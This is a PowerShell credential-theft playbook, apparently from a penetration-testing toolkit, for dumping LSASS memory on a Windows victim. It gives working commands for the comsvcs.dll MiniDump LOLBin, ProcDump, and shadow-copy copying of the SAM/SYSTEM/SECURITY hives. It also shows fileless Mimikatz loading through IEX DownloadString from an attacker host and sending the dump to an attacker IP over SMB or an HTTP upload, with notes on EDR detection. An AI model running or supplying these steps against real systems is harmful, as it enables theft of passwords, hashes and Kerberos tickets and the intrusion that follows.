# ============================================================
# LSASS Dump Methods — Credential Extraction
# ============================================================
# LSASS (Local Security Authority Subsystem Service) holds
# plaintext passwords, NTLM hashes, and Kerberos tickets in
# memory. Dumping it is often the fastest path to credentials.
#
# IMPORTANT: These methods create a .dmp file on disk.
# Transfer the dump back to Kali and parse with mimikatz.
#
# Parse on Kali:
#   mimikatz # sekurlsa::minidump lsass.dmp
#   mimikatz # sekurlsa::logonpasswords
#
# Or with impacket:
#   impacket-secretsdump -just-dc-user Administrator LOCAL
# ============================================================


# ============================================================
# METHOD 1: comsvcs.dll MiniDump — LOLBin, no extra tools
# ============================================================
# comsvcs.dll is a Windows DLL that ships with every Windows
# install. It exports a function called MiniDump that wraps
# the standard MiniDumpWriteDump API. We call it via rundll32.
#
# REQUIRES: Admin privileges (or SYSTEM)
# DETECTION: Medium — rundll32 with comsvcs is monitored by EDR
#            but it's a legitimate Windows binary, not malware
#
# Steps:
#   1. Get LSASS PID
#   2. Run rundll32 with MiniDump
#   3. Transfer lsass.dmp to Kali

# Get LSASS PID:
$lsassPid = (Get-Process lsass).Id
Write-Host "LSASS PID: $lsassPid"

# Dump LSASS to file:
$dumpPath = "C:\Windows\Temp\lsass.dmp"
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsassPid $dumpPath full

# Or as a one-liner (run from cmd.exe or PowerShell):
# $pid = (Get-Process lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full


# ============================================================
# METHOD 2: Task Manager (interactive, GUI)
# ============================================================
# Right-click LSASS in Task Manager → Create dump file
# The dump goes to: C:\Users\<user>\AppData\Local\Temp\lsass.DMP
# Useful when you have RDP access.


# ============================================================
# METHOD 3: ProcDump (Sysinternals — needs binary)
# ============================================================
# If you can drop a binary, ProcDump produces the cleanest dump
# and is a Microsoft-signed Sysinternals tool (AV-friendly).

# Upload procdump64.exe to victim, then:
# C:\Windows\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Or by PID:
# C:\Windows\Temp\procdump64.exe -accepteula -ma $lsassPid C:\Windows\Temp\lsass.dmp


# ============================================================
# METHOD 4: Shadow Copy extraction (bypasses file locks)
# ============================================================
# If LSASS dump is blocked (PPL — Protected Process Light),
# extract SAM/SYSTEM/SECURITY from a Volume Shadow Copy instead.

# Create a shadow copy:
wmic shadowcopy call create Volume='C:\'

# List shadow copies:
vssadmin list shadows

# Copy SAM/SYSTEM from shadow (replace shadow path from above output):
# cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM
# cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
# cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY


# ============================================================
# METHOD 5: In-memory via Invoke-SharpLoader (no disk dump)
# ============================================================
# The cleanest method — load Mimikatz directly into memory.
# See 03-loaders/reflective/ for full workflow.
#
# Kali: encrypt mimikatz.exe
#   . ./Invoke-SharpEncrypt.ps1
#   Invoke-SharpEncrypt -file mimikatz.exe -password "pass123" -outfile mimikatz.enc
#
# Victim: load and run
#   IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-SharpLoader.ps1')
#   Invoke-SharpLoader -location "http://KALI/mimikatz.enc" -password "pass123" -argument "sekurlsa::logonpasswords" -argument2 "exit"


# ============================================================
# Transfer dump back to Kali
# ============================================================

# Method A: SMB share (Kali side first)
# Kali: sudo impacket-smbserver share . -smb2support -username user -password pass
# Victim:
$kali = "192.168.45.202"
$share = "share"
net use \\$kali\$share /user:user pass
copy C:\Windows\Temp\lsass.dmp \\$kali\$share\lsass.dmp

# Method B: PowerShell WebClient upload
# Kali: nc -lvp 9090 > lsass.dmp
$dumpBytes = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp")
$wc = New-Object System.Net.WebClient
$wc.UploadData("http://192.168.45.202:9090/upload", $dumpBytes)


# ============================================================
# Parse dump on Kali
# ============================================================
# mimikatz.exe:
#   sekurlsa::minidump lsass.dmp
#   sekurlsa::logonpasswords

# pypykatz (Python, no Windows needed):
#   pip3 install pypykatz
#   pypykatz lsa minidump lsass.dmp
